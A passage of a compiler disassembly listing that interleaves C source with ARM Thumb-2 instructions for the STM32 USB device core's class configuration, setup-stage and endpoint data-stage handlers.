  /* Prevent unused argument compilation warning */
  UNUSED(pdev);

  return USBD_OK;
 800af0e:	2300      	movs	r3, #0
#endif /* USBD_HS_TESTMODE_ENABLE */
}
 800af10:	4618      	mov	r0, r3
 800af12:	370c      	adds	r7, #12
 800af14:	46bd      	mov	sp, r7
 800af16:	f85d 7b04 	ldr.w	r7, [sp], #4
 800af1a:	4770      	bx	lr

0800af1c <USBD_SetClassConfig>:
  * @param  cfgidx: configuration index
  * @retval status
  */

USBD_StatusTypeDef USBD_SetClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af1c:	b580      	push	{r7, lr}
 800af1e:	b084      	sub	sp, #16
 800af20:	af00      	add	r7, sp, #0
 800af22:	6078      	str	r0, [r7, #4]
 800af24:	460b      	mov	r3, r1
 800af26:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af28:	2300      	movs	r3, #0
 800af2a:	73fb      	strb	r3, [r7, #15]
        }
      }
    }
  }
#else
  if (pdev->pClass[0] != NULL)
 800af2c:	687b      	ldr	r3, [r7, #4]
 800af2e:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af32:	2b00      	cmp	r3, #0
 800af34:	d009      	beq.n	800af4a <USBD_SetClassConfig+0x2e>
  {
    /* Set configuration and Start the Class */
    ret = (USBD_StatusTypeDef)pdev->pClass[0]->Init(pdev, cfgidx);
 800af36:	687b      	ldr	r3, [r7, #4]
 800af38:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af3c:	681b      	ldr	r3, [r3, #0]
 800af3e:	78fa      	ldrb	r2, [r7, #3]
 800af40:	4611      	mov	r1, r2
 800af42:	6878      	ldr	r0, [r7, #4]
 800af44:	4798      	blx	r3
 800af46:	4603      	mov	r3, r0
 800af48:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af4a:	7bfb      	ldrb	r3, [r7, #15]
}
 800af4c:	4618      	mov	r0, r3
 800af4e:	3710      	adds	r7, #16
 800af50:	46bd      	mov	sp, r7
 800af52:	bd80      	pop	{r7, pc}

0800af54 <USBD_ClrClassConfig>:
  * @param  pdev: device instance
  * @param  cfgidx: configuration index
  * @retval status: USBD_StatusTypeDef
  */
USBD_StatusTypeDef USBD_ClrClassConfig(USBD_HandleTypeDef *pdev, uint8_t cfgidx)
{
 800af54:	b580      	push	{r7, lr}
 800af56:	b084      	sub	sp, #16
 800af58:	af00      	add	r7, sp, #0
 800af5a:	6078      	str	r0, [r7, #4]
 800af5c:	460b      	mov	r3, r1
 800af5e:	70fb      	strb	r3, [r7, #3]
  USBD_StatusTypeDef ret = USBD_OK;
 800af60:	2300      	movs	r3, #0
 800af62:	73fb      	strb	r3, [r7, #15]
      }
    }
  }
#else
  /* Clear configuration  and De-initialize the Class process */
  if (pdev->pClass[0]->DeInit(pdev, cfgidx) != 0U)
 800af64:	687b      	ldr	r3, [r7, #4]
 800af66:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800af6a:	685b      	ldr	r3, [r3, #4]
 800af6c:	78fa      	ldrb	r2, [r7, #3]
 800af6e:	4611      	mov	r1, r2
 800af70:	6878      	ldr	r0, [r7, #4]
 800af72:	4798      	blx	r3
 800af74:	4603      	mov	r3, r0
 800af76:	2b00      	cmp	r3, #0
 800af78:	d001      	beq.n	800af7e <USBD_ClrClassConfig+0x2a>
  {
    ret = USBD_FAIL;
 800af7a:	2303      	movs	r3, #3
 800af7c:	73fb      	strb	r3, [r7, #15]
  }
#endif /* USE_USBD_COMPOSITE */

  return ret;
 800af7e:	7bfb      	ldrb	r3, [r7, #15]
}
 800af80:	4618      	mov	r0, r3
 800af82:	3710      	adds	r7, #16
 800af84:	46bd      	mov	sp, r7
 800af86:	bd80      	pop	{r7, pc}

0800af88 <USBD_LL_SetupStage>:
  *         Handle the setup stage
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetupStage(USBD_HandleTypeDef *pdev, uint8_t *psetup)
{
 800af88:	b580      	push	{r7, lr}
 800af8a:	b084      	sub	sp, #16
 800af8c:	af00      	add	r7, sp, #0
 800af8e:	6078      	str	r0, [r7, #4]
 800af90:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret;

  USBD_ParseSetupRequest(&pdev->request, psetup);
 800af92:	687b      	ldr	r3, [r7, #4]
 800af94:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800af98:	6839      	ldr	r1, [r7, #0]
 800af9a:	4618      	mov	r0, r3
 800af9c:	f001 f8a7 	bl	800c0ee <USBD_ParseSetupRequest>

  pdev->ep0_state = USBD_EP0_SETUP;
 800afa0:	687b      	ldr	r3, [r7, #4]
 800afa2:	2201      	movs	r2, #1
 800afa4:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  pdev->ep0_data_len = pdev->request.wLength;
 800afa8:	687b      	ldr	r3, [r7, #4]
 800afaa:	f8b3 32b0 	ldrh.w	r3, [r3, #688]	; 0x2b0
 800afae:	461a      	mov	r2, r3
 800afb0:	687b      	ldr	r3, [r7, #4]
 800afb2:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

  switch (pdev->request.bmRequest & 0x1FU)
 800afb6:	687b      	ldr	r3, [r7, #4]
 800afb8:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800afbc:	f003 031f 	and.w	r3, r3, #31
 800afc0:	2b02      	cmp	r3, #2
 800afc2:	d01a      	beq.n	800affa <USBD_LL_SetupStage+0x72>
 800afc4:	2b02      	cmp	r3, #2
 800afc6:	d822      	bhi.n	800b00e <USBD_LL_SetupStage+0x86>
 800afc8:	2b00      	cmp	r3, #0
 800afca:	d002      	beq.n	800afd2 <USBD_LL_SetupStage+0x4a>
 800afcc:	2b01      	cmp	r3, #1
 800afce:	d00a      	beq.n	800afe6 <USBD_LL_SetupStage+0x5e>
 800afd0:	e01d      	b.n	800b00e <USBD_LL_SetupStage+0x86>
  {
    case USB_REQ_RECIPIENT_DEVICE:
      ret = USBD_StdDevReq(pdev, &pdev->request);
 800afd2:	687b      	ldr	r3, [r7, #4]
 800afd4:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800afd8:	4619      	mov	r1, r3
 800afda:	6878      	ldr	r0, [r7, #4]
 800afdc:	f000 fad4 	bl	800b588 <USBD_StdDevReq>
 800afe0:	4603      	mov	r3, r0
 800afe2:	73fb      	strb	r3, [r7, #15]
      break;
 800afe4:	e020      	b.n	800b028 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_INTERFACE:
      ret = USBD_StdItfReq(pdev, &pdev->request);
 800afe6:	687b      	ldr	r3, [r7, #4]
 800afe8:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800afec:	4619      	mov	r1, r3
 800afee:	6878      	ldr	r0, [r7, #4]
 800aff0:	f000 fb3c 	bl	800b66c <USBD_StdItfReq>
 800aff4:	4603      	mov	r3, r0
 800aff6:	73fb      	strb	r3, [r7, #15]
      break;
 800aff8:	e016      	b.n	800b028 <USBD_LL_SetupStage+0xa0>

    case USB_REQ_RECIPIENT_ENDPOINT:
      ret = USBD_StdEPReq(pdev, &pdev->request);
 800affa:	687b      	ldr	r3, [r7, #4]
 800affc:	f203 23aa 	addw	r3, r3, #682	; 0x2aa
 800b000:	4619      	mov	r1, r3
 800b002:	6878      	ldr	r0, [r7, #4]
 800b004:	f000 fb9e 	bl	800b744 <USBD_StdEPReq>
 800b008:	4603      	mov	r3, r0
 800b00a:	73fb      	strb	r3, [r7, #15]
      break;
 800b00c:	e00c      	b.n	800b028 <USBD_LL_SetupStage+0xa0>

    default:
      ret = USBD_LL_StallEP(pdev, (pdev->request.bmRequest & 0x80U));
 800b00e:	687b      	ldr	r3, [r7, #4]
 800b010:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b014:	f023 037f 	bic.w	r3, r3, #127	; 0x7f
 800b018:	b2db      	uxtb	r3, r3
 800b01a:	4619      	mov	r1, r3
 800b01c:	6878      	ldr	r0, [r7, #4]
 800b01e:	f001 fe13 	bl	800cc48 <USBD_LL_StallEP>
 800b022:	4603      	mov	r3, r0
 800b024:	73fb      	strb	r3, [r7, #15]
      break;
 800b026:	bf00      	nop
  }

  return ret;
 800b028:	7bfb      	ldrb	r3, [r7, #15]
}
 800b02a:	4618      	mov	r0, r3
 800b02c:	3710      	adds	r7, #16
 800b02e:	46bd      	mov	sp, r7
 800b030:	bd80      	pop	{r7, pc}

0800b032 <USBD_LL_DataOutStage>:
  * @param  pdata: data pointer
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataOutStage(USBD_HandleTypeDef *pdev,
                                        uint8_t epnum, uint8_t *pdata)
{
 800b032:	b580      	push	{r7, lr}
 800b034:	b086      	sub	sp, #24
 800b036:	af00      	add	r7, sp, #0
 800b038:	60f8      	str	r0, [r7, #12]
 800b03a:	460b      	mov	r3, r1
 800b03c:	607a      	str	r2, [r7, #4]
 800b03e:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret = USBD_OK;
 800b040:	2300      	movs	r3, #0
 800b042:	75fb      	strb	r3, [r7, #23]
  uint8_t idx;

  if (epnum == 0U)
 800b044:	7afb      	ldrb	r3, [r7, #11]
 800b046:	2b00      	cmp	r3, #0
 800b048:	d16e      	bne.n	800b128 <USBD_LL_DataOutStage+0xf6>
  {
    pep = &pdev->ep_out[0];
 800b04a:	68fb      	ldr	r3, [r7, #12]
 800b04c:	f503 73aa 	add.w	r3, r3, #340	; 0x154
 800b050:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_OUT)
 800b052:	68fb      	ldr	r3, [r7, #12]
 800b054:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b058:	2b03      	cmp	r3, #3
 800b05a:	f040 8098 	bne.w	800b18e <USBD_LL_DataOutStage+0x15c>
    {
      if (pep->rem_length > pep->maxpacket)
 800b05e:	693b      	ldr	r3, [r7, #16]
 800b060:	689a      	ldr	r2, [r3, #8]
 800b062:	693b      	ldr	r3, [r7, #16]
 800b064:	68db      	ldr	r3, [r3, #12]
 800b066:	429a      	cmp	r2, r3
 800b068:	d913      	bls.n	800b092 <USBD_LL_DataOutStage+0x60>
      {
        pep->rem_length -= pep->maxpacket;
 800b06a:	693b      	ldr	r3, [r7, #16]
 800b06c:	689a      	ldr	r2, [r3, #8]
 800b06e:	693b      	ldr	r3, [r7, #16]
 800b070:	68db      	ldr	r3, [r3, #12]
 800b072:	1ad2      	subs	r2, r2, r3
 800b074:	693b      	ldr	r3, [r7, #16]
 800b076:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueRx(pdev, pdata, MIN(pep->rem_length, pep->maxpacket));
 800b078:	693b      	ldr	r3, [r7, #16]
 800b07a:	68da      	ldr	r2, [r3, #12]
 800b07c:	693b      	ldr	r3, [r7, #16]
 800b07e:	689b      	ldr	r3, [r3, #8]
 800b080:	4293      	cmp	r3, r2
 800b082:	bf28      	it	cs
 800b084:	4613      	movcs	r3, r2
 800b086:	461a      	mov	r2, r3
 800b088:	6879      	ldr	r1, [r7, #4]
 800b08a:	68f8      	ldr	r0, [r7, #12]
 800b08c:	f001 f923 	bl	800c2d6 <USBD_CtlContinueRx>
 800b090:	e07d      	b.n	800b18e <USBD_LL_DataOutStage+0x15c>
      }
      else
      {
        /* Find the class ID relative to the current request */
        switch (pdev->request.bmRequest & 0x1FU)
 800b092:	68fb      	ldr	r3, [r7, #12]
 800b094:	f893 32aa 	ldrb.w	r3, [r3, #682]	; 0x2aa
 800b098:	f003 031f 	and.w	r3, r3, #31
 800b09c:	2b02      	cmp	r3, #2
 800b09e:	d014      	beq.n	800b0ca <USBD_LL_DataOutStage+0x98>
 800b0a0:	2b02      	cmp	r3, #2
 800b0a2:	d81d      	bhi.n	800b0e0 <USBD_LL_DataOutStage+0xae>
 800b0a4:	2b00      	cmp	r3, #0
 800b0a6:	d002      	beq.n	800b0ae <USBD_LL_DataOutStage+0x7c>
 800b0a8:	2b01      	cmp	r3, #1
 800b0aa:	d003      	beq.n	800b0b4 <USBD_LL_DataOutStage+0x82>
 800b0ac:	e018      	b.n	800b0e0 <USBD_LL_DataOutStage+0xae>
        {
          case USB_REQ_RECIPIENT_DEVICE:
            /* Device requests must be managed by the first instantiated class
               (or duplicated by all classes for simplicity) */
            idx = 0U;
 800b0ae:	2300      	movs	r3, #0
 800b0b0:	75bb      	strb	r3, [r7, #22]
            break;
 800b0b2:	e018      	b.n	800b0e6 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_INTERFACE:
            idx = USBD_CoreFindIF(pdev, LOBYTE(pdev->request.wIndex));
 800b0b4:	68fb      	ldr	r3, [r7, #12]
 800b0b6:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0ba:	b2db      	uxtb	r3, r3
 800b0bc:	4619      	mov	r1, r3
 800b0be:	68f8      	ldr	r0, [r7, #12]
 800b0c0:	f000 f9d2 	bl	800b468 <USBD_CoreFindIF>
 800b0c4:	4603      	mov	r3, r0
 800b0c6:	75bb      	strb	r3, [r7, #22]
            break;
 800b0c8:	e00d      	b.n	800b0e6 <USBD_LL_DataOutStage+0xb4>

          case USB_REQ_RECIPIENT_ENDPOINT:
            idx = USBD_CoreFindEP(pdev, LOBYTE(pdev->request.wIndex));
 800b0ca:	68fb      	ldr	r3, [r7, #12]
 800b0cc:	f8b3 32ae 	ldrh.w	r3, [r3, #686]	; 0x2ae
 800b0d0:	b2db      	uxtb	r3, r3
 800b0d2:	4619      	mov	r1, r3
 800b0d4:	68f8      	ldr	r0, [r7, #12]
 800b0d6:	f000 f9d4 	bl	800b482 <USBD_CoreFindEP>
 800b0da:	4603      	mov	r3, r0
 800b0dc:	75bb      	strb	r3, [r7, #22]
            break;
 800b0de:	e002      	b.n	800b0e6 <USBD_LL_DataOutStage+0xb4>

          default:
            /* Back to the first class in case of doubt */
            idx = 0U;
 800b0e0:	2300      	movs	r3, #0
 800b0e2:	75bb      	strb	r3, [r7, #22]
            break;
 800b0e4:	bf00      	nop
        }

        if (idx < USBD_MAX_SUPPORTED_CLASS)
 800b0e6:	7dbb      	ldrb	r3, [r7, #22]
 800b0e8:	2b00      	cmp	r3, #0
 800b0ea:	d119      	bne.n	800b120 <USBD_LL_DataOutStage+0xee>
        {
          /* Setup the class ID and route the request to the relative class function */
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b0ec:	68fb      	ldr	r3, [r7, #12]
 800b0ee:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b0f2:	b2db      	uxtb	r3, r3
 800b0f4:	2b03      	cmp	r3, #3
 800b0f6:	d113      	bne.n	800b120 <USBD_LL_DataOutStage+0xee>
          {
            if (pdev->pClass[idx]->EP0_RxReady != NULL)
 800b0f8:	7dba      	ldrb	r2, [r7, #22]
 800b0fa:	68fb      	ldr	r3, [r7, #12]
 800b0fc:	32ae      	adds	r2, #174	; 0xae
 800b0fe:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b102:	691b      	ldr	r3, [r3, #16]
 800b104:	2b00      	cmp	r3, #0
 800b106:	d00b      	beq.n	800b120 <USBD_LL_DataOutStage+0xee>
            {
              pdev->classId = idx;
 800b108:	7dba      	ldrb	r2, [r7, #22]
 800b10a:	68fb      	ldr	r3, [r7, #12]
 800b10c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[idx]->EP0_RxReady(pdev);
 800b110:	7dba      	ldrb	r2, [r7, #22]
 800b112:	68fb      	ldr	r3, [r7, #12]
 800b114:	32ae      	adds	r2, #174	; 0xae
 800b116:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b11a:	691b      	ldr	r3, [r3, #16]
 800b11c:	68f8      	ldr	r0, [r7, #12]
 800b11e:	4798      	blx	r3
            }
          }
        }

        (void)USBD_CtlSendStatus(pdev);
 800b120:	68f8      	ldr	r0, [r7, #12]
 800b122:	f001 f8e9 	bl	800c2f8 <USBD_CtlSendStatus>
 800b126:	e032      	b.n	800b18e <USBD_LL_DataOutStage+0x15c>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, (epnum & 0x7FU));
 800b128:	7afb      	ldrb	r3, [r7, #11]
 800b12a:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800b12e:	b2db      	uxtb	r3, r3
 800b130:	4619      	mov	r1, r3
 800b132:	68f8      	ldr	r0, [r7, #12]
 800b134:	f000 f9a5 	bl	800b482 <USBD_CoreFindEP>
 800b138:	4603      	mov	r3, r0
 800b13a:	75bb      	strb	r3, [r7, #22]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b13c:	7dbb      	ldrb	r3, [r7, #22]
 800b13e:	2bff      	cmp	r3, #255	; 0xff
 800b140:	d025      	beq.n	800b18e <USBD_LL_DataOutStage+0x15c>
 800b142:	7dbb      	ldrb	r3, [r7, #22]
 800b144:	2b00      	cmp	r3, #0
 800b146:	d122      	bne.n	800b18e <USBD_LL_DataOutStage+0x15c>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b148:	68fb      	ldr	r3, [r7, #12]
 800b14a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b14e:	b2db      	uxtb	r3, r3
 800b150:	2b03      	cmp	r3, #3
 800b152:	d117      	bne.n	800b184 <USBD_LL_DataOutStage+0x152>
      {
        if (pdev->pClass[idx]->DataOut != NULL)
 800b154:	7dba      	ldrb	r2, [r7, #22]
 800b156:	68fb      	ldr	r3, [r7, #12]
 800b158:	32ae      	adds	r2, #174	; 0xae
 800b15a:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b15e:	699b      	ldr	r3, [r3, #24]
 800b160:	2b00      	cmp	r3, #0
 800b162:	d00f      	beq.n	800b184 <USBD_LL_DataOutStage+0x152>
        {
          pdev->classId = idx;
 800b164:	7dba      	ldrb	r2, [r7, #22]
 800b166:	68fb      	ldr	r3, [r7, #12]
 800b168:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataOut(pdev, epnum);
 800b16c:	7dba      	ldrb	r2, [r7, #22]
 800b16e:	68fb      	ldr	r3, [r7, #12]
 800b170:	32ae      	adds	r2, #174	; 0xae
 800b172:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b176:	699b      	ldr	r3, [r3, #24]
 800b178:	7afa      	ldrb	r2, [r7, #11]
 800b17a:	4611      	mov	r1, r2
 800b17c:	68f8      	ldr	r0, [r7, #12]
 800b17e:	4798      	blx	r3
 800b180:	4603      	mov	r3, r0
 800b182:	75fb      	strb	r3, [r7, #23]
        }
      }
      if (ret != USBD_OK)
 800b184:	7dfb      	ldrb	r3, [r7, #23]
 800b186:	2b00      	cmp	r3, #0
 800b188:	d001      	beq.n	800b18e <USBD_LL_DataOutStage+0x15c>
      {
        return ret;
 800b18a:	7dfb      	ldrb	r3, [r7, #23]
 800b18c:	e000      	b.n	800b190 <USBD_LL_DataOutStage+0x15e>
      }
    }
  }

  return USBD_OK;
 800b18e:	2300      	movs	r3, #0
}
 800b190:	4618      	mov	r0, r3
 800b192:	3718      	adds	r7, #24
 800b194:	46bd      	mov	sp, r7
 800b196:	bd80      	pop	{r7, pc}

0800b198 <USBD_LL_DataInStage>:
  * @param  epnum: endpoint index
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_DataInStage(USBD_HandleTypeDef *pdev,
                                       uint8_t epnum, uint8_t *pdata)
{
 800b198:	b580      	push	{r7, lr}
 800b19a:	b086      	sub	sp, #24
 800b19c:	af00      	add	r7, sp, #0
 800b19e:	60f8      	str	r0, [r7, #12]
 800b1a0:	460b      	mov	r3, r1
 800b1a2:	607a      	str	r2, [r7, #4]
 800b1a4:	72fb      	strb	r3, [r7, #11]
  USBD_EndpointTypeDef *pep;
  USBD_StatusTypeDef ret;
  uint8_t idx;

  if (epnum == 0U)
 800b1a6:	7afb      	ldrb	r3, [r7, #11]
 800b1a8:	2b00      	cmp	r3, #0
 800b1aa:	d16f      	bne.n	800b28c <USBD_LL_DataInStage+0xf4>
  {
    pep = &pdev->ep_in[0];
 800b1ac:	68fb      	ldr	r3, [r7, #12]
 800b1ae:	3314      	adds	r3, #20
 800b1b0:	613b      	str	r3, [r7, #16]

    if (pdev->ep0_state == USBD_EP0_DATA_IN)
 800b1b2:	68fb      	ldr	r3, [r7, #12]
 800b1b4:	f8d3 3294 	ldr.w	r3, [r3, #660]	; 0x294
 800b1b8:	2b02      	cmp	r3, #2
 800b1ba:	d15a      	bne.n	800b272 <USBD_LL_DataInStage+0xda>
    {
      if (pep->rem_length > pep->maxpacket)
 800b1bc:	693b      	ldr	r3, [r7, #16]
 800b1be:	689a      	ldr	r2, [r3, #8]
 800b1c0:	693b      	ldr	r3, [r7, #16]
 800b1c2:	68db      	ldr	r3, [r3, #12]
 800b1c4:	429a      	cmp	r2, r3
 800b1c6:	d914      	bls.n	800b1f2 <USBD_LL_DataInStage+0x5a>
      {
        pep->rem_length -= pep->maxpacket;
 800b1c8:	693b      	ldr	r3, [r7, #16]
 800b1ca:	689a      	ldr	r2, [r3, #8]
 800b1cc:	693b      	ldr	r3, [r7, #16]
 800b1ce:	68db      	ldr	r3, [r3, #12]
 800b1d0:	1ad2      	subs	r2, r2, r3
 800b1d2:	693b      	ldr	r3, [r7, #16]
 800b1d4:	609a      	str	r2, [r3, #8]

        (void)USBD_CtlContinueSendData(pdev, pdata, pep->rem_length);
 800b1d6:	693b      	ldr	r3, [r7, #16]
 800b1d8:	689b      	ldr	r3, [r3, #8]
 800b1da:	461a      	mov	r2, r3
 800b1dc:	6879      	ldr	r1, [r7, #4]
 800b1de:	68f8      	ldr	r0, [r7, #12]
 800b1e0:	f001 f84b 	bl	800c27a <USBD_CtlContinueSendData>

        /* Prepare endpoint for premature end of transfer */
        (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b1e4:	2300      	movs	r3, #0
 800b1e6:	2200      	movs	r2, #0
 800b1e8:	2100      	movs	r1, #0
 800b1ea:	68f8      	ldr	r0, [r7, #12]
 800b1ec:	f001 fe34 	bl	800ce58 <USBD_LL_PrepareReceive>
 800b1f0:	e03f      	b.n	800b272 <USBD_LL_DataInStage+0xda>
      }
      else
      {
        /* last packet is MPS multiple, so send ZLP packet */
        if ((pep->maxpacket == pep->rem_length) &&
 800b1f2:	693b      	ldr	r3, [r7, #16]
 800b1f4:	68da      	ldr	r2, [r3, #12]
 800b1f6:	693b      	ldr	r3, [r7, #16]
 800b1f8:	689b      	ldr	r3, [r3, #8]
 800b1fa:	429a      	cmp	r2, r3
 800b1fc:	d11c      	bne.n	800b238 <USBD_LL_DataInStage+0xa0>
            (pep->total_length >= pep->maxpacket) &&
 800b1fe:	693b      	ldr	r3, [r7, #16]
 800b200:	685a      	ldr	r2, [r3, #4]
 800b202:	693b      	ldr	r3, [r7, #16]
 800b204:	68db      	ldr	r3, [r3, #12]
        if ((pep->maxpacket == pep->rem_length) &&
 800b206:	429a      	cmp	r2, r3
 800b208:	d316      	bcc.n	800b238 <USBD_LL_DataInStage+0xa0>
            (pep->total_length < pdev->ep0_data_len))
 800b20a:	693b      	ldr	r3, [r7, #16]
 800b20c:	685a      	ldr	r2, [r3, #4]
 800b20e:	68fb      	ldr	r3, [r7, #12]
 800b210:	f8d3 3298 	ldr.w	r3, [r3, #664]	; 0x298
            (pep->total_length >= pep->maxpacket) &&
 800b214:	429a      	cmp	r2, r3
 800b216:	d20f      	bcs.n	800b238 <USBD_LL_DataInStage+0xa0>
        {
          (void)USBD_CtlContinueSendData(pdev, NULL, 0U);
 800b218:	2200      	movs	r2, #0
 800b21a:	2100      	movs	r1, #0
 800b21c:	68f8      	ldr	r0, [r7, #12]
 800b21e:	f001 f82c 	bl	800c27a <USBD_CtlContinueSendData>
          pdev->ep0_data_len = 0U;
 800b222:	68fb      	ldr	r3, [r7, #12]
 800b224:	2200      	movs	r2, #0
 800b226:	f8c3 2298 	str.w	r2, [r3, #664]	; 0x298

          /* Prepare endpoint for premature end of transfer */
          (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800b22a:	2300      	movs	r3, #0
 800b22c:	2200      	movs	r2, #0
 800b22e:	2100      	movs	r1, #0
 800b230:	68f8      	ldr	r0, [r7, #12]
 800b232:	f001 fe11 	bl	800ce58 <USBD_LL_PrepareReceive>
 800b236:	e01c      	b.n	800b272 <USBD_LL_DataInStage+0xda>
        }
        else
        {
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b238:	68fb      	ldr	r3, [r7, #12]
 800b23a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b23e:	b2db      	uxtb	r3, r3
 800b240:	2b03      	cmp	r3, #3
 800b242:	d10f      	bne.n	800b264 <USBD_LL_DataInStage+0xcc>
          {
            if (pdev->pClass[0]->EP0_TxSent != NULL)
 800b244:	68fb      	ldr	r3, [r7, #12]
 800b246:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b24a:	68db      	ldr	r3, [r3, #12]
 800b24c:	2b00      	cmp	r3, #0
 800b24e:	d009      	beq.n	800b264 <USBD_LL_DataInStage+0xcc>
            {
              pdev->classId = 0U;
 800b250:	68fb      	ldr	r3, [r7, #12]
 800b252:	2200      	movs	r2, #0
 800b254:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
              pdev->pClass[0]->EP0_TxSent(pdev);
 800b258:	68fb      	ldr	r3, [r7, #12]
 800b25a:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b25e:	68db      	ldr	r3, [r3, #12]
 800b260:	68f8      	ldr	r0, [r7, #12]
 800b262:	4798      	blx	r3
            }
          }
          (void)USBD_LL_StallEP(pdev, 0x80U);
 800b264:	2180      	movs	r1, #128	; 0x80
 800b266:	68f8      	ldr	r0, [r7, #12]
 800b268:	f001 fcee 	bl	800cc48 <USBD_LL_StallEP>
          (void)USBD_CtlReceiveStatus(pdev);
 800b26c:	68f8      	ldr	r0, [r7, #12]
 800b26e:	f001 f856 	bl	800c31e <USBD_CtlReceiveStatus>
        }
      }
    }

    if (pdev->dev_test_mode != 0U)
 800b272:	68fb      	ldr	r3, [r7, #12]
 800b274:	f893 32a0 	ldrb.w	r3, [r3, #672]	; 0x2a0
 800b278:	2b00      	cmp	r3, #0
 800b27a:	d03a      	beq.n	800b2f2 <USBD_LL_DataInStage+0x15a>
    {
      (void)USBD_RunTestMode(pdev);
 800b27c:	68f8      	ldr	r0, [r7, #12]
 800b27e:	f7ff fe42 	bl	800af06 <USBD_RunTestMode>
      pdev->dev_test_mode = 0U;
 800b282:	68fb      	ldr	r3, [r7, #12]
 800b284:	2200      	movs	r2, #0
 800b286:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
 800b28a:	e032      	b.n	800b2f2 <USBD_LL_DataInStage+0x15a>
    }
  }
  else
  {
    /* Get the class index relative to this interface */
    idx = USBD_CoreFindEP(pdev, ((uint8_t)epnum | 0x80U));
 800b28c:	7afb      	ldrb	r3, [r7, #11]
 800b28e:	f063 037f 	orn	r3, r3, #127	; 0x7f
 800b292:	b2db      	uxtb	r3, r3
 800b294:	4619      	mov	r1, r3
 800b296:	68f8      	ldr	r0, [r7, #12]
 800b298:	f000 f8f3 	bl	800b482 <USBD_CoreFindEP>
 800b29c:	4603      	mov	r3, r0
 800b29e:	75fb      	strb	r3, [r7, #23]

    if (((uint16_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b2a0:	7dfb      	ldrb	r3, [r7, #23]
 800b2a2:	2bff      	cmp	r3, #255	; 0xff
 800b2a4:	d025      	beq.n	800b2f2 <USBD_LL_DataInStage+0x15a>
 800b2a6:	7dfb      	ldrb	r3, [r7, #23]
 800b2a8:	2b00      	cmp	r3, #0
 800b2aa:	d122      	bne.n	800b2f2 <USBD_LL_DataInStage+0x15a>
    {
      /* Call the class data out function to manage the request */
      if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b2ac:	68fb      	ldr	r3, [r7, #12]
 800b2ae:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b2b2:	b2db      	uxtb	r3, r3
 800b2b4:	2b03      	cmp	r3, #3
 800b2b6:	d11c      	bne.n	800b2f2 <USBD_LL_DataInStage+0x15a>
      {
        if (pdev->pClass[idx]->DataIn != NULL)
 800b2b8:	7dfa      	ldrb	r2, [r7, #23]
 800b2ba:	68fb      	ldr	r3, [r7, #12]
 800b2bc:	32ae      	adds	r2, #174	; 0xae
 800b2be:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b2c2:	695b      	ldr	r3, [r3, #20]
 800b2c4:	2b00      	cmp	r3, #0
 800b2c6:	d014      	beq.n	800b2f2 <USBD_LL_DataInStage+0x15a>
        {
          pdev->classId = idx;
 800b2c8:	7dfa      	ldrb	r2, [r7, #23]
 800b2ca:	68fb      	ldr	r3, [r7, #12]
 800b2cc:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->DataIn(pdev, epnum);
 800b2d0:	7dfa      	ldrb	r2, [r7, #23]
 800b2d2:	68fb      	ldr	r3, [r7, #12]
 800b2d4:	32ae      	adds	r2, #174	; 0xae
